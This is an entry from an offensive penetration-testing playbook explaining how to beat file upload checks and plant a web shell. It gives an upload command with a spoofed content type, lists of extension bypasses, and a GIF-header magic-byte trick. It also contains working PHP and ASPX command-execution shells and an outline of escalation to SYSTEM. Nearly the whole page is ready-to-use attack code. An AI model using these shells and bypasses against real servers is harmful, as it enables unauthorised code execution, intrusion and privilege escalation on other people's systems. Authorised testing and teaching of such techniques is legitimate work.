---
id: file-upload-shell
title: File Upload → Shell
stage: initial-access
tags: [windows, linux, web]
summary: Bypass file upload restrictions to plant a web shell — extension filters, content-type checks, and magic bytes are the three layers to defeat.
leads_to:
  - web-shell
  - rev-shell
---

## Prerequisites

A file upload endpoint that serves uploaded files from a web-accessible path. If uploads go to a non-web directory (e.g., `/tmp/`), you need a separate LFI or directory traversal to trigger execution.

Upload restrictions exist in three layers: extension validation (blocked list or allowlist), content-type header check, and magic bytes inspection. Most applications only check one or two — defeating the right layer gets your PHP shell executed. Find where the file lands after upload (check the response URL, or directory bust under `/uploads/`, `/files/`, `/images/`), then trigger it with `?cmd=id`.

## Quick Win

> PHP shell with content-type spoofed to image/jpeg — bypasses header-only validation.

```bash
curl -F 'file=@shell.php;type=image/jpeg' http://$TARGET/upload
```

## Extension Bypass

> Alternate extensions that PHP still executes — try each if `.php` is blocked.

```
shell.php5
shell.phtml
shell.shtml
shell.pHp
shell.php.jpg       (double extension — only if server strips last extension)
shell.php%00.jpg    (null byte — PHP < 5.3.4 only)
```

## Content-Type Bypass

> Change the Content-Type header in Burp — many validators only check this, not the file content.

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

## Magic Bytes Bypass

> Prepend GIF header to trick magic byte validators while keeping PHP executable.

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

## Shell Payloads

> Minimal PHP and ASPX shells — access via browser, then upgrade to rev-shell.

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
```

## Leads To

Shell uploaded and accessible → `?cmd=id` confirms execution → web-shell for interactive browsing or swap `id` for a rev-shell payload. ASPX shell on IIS → cmd.exe context → `whoami /priv` → SeImpersonatePrivilege → SYSTEM via GodPotato. PHP shell on Linux → www-data → standard linux privesc chain.
